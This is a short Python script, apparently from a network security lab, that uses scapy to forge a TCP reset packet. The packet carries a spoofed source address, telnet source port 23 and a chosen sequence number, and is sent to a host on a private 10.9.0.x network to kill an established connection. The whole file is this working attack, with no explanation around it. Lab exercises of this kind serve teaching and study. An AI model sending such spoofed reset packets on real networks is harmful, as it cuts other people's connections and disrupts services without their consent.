#!/usr/bin/env python3
from tabnanny import verbose
from scapy.all import *

ip = IP(src="10.9.0.5", dst="10.9.0.6")
tcp = TCP(sport=23, dport=33400, flags="R", seq=1158697815)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)